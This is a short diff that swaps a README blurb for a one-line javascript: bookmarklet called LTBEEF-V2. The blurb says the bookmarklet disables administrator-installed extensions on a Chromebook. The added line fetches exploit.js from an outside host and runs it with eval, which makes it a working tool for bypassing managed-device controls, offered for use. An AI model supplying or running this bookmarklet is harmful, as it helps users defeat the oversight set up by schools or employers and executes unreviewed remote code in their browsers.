@@ -1,2 +1,1 @@
-# LTBEEF-V2
-Creds to compact cow LTEEF Is a bookmarklet that lets you disable admin installed extensions on your chromebook.
+javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
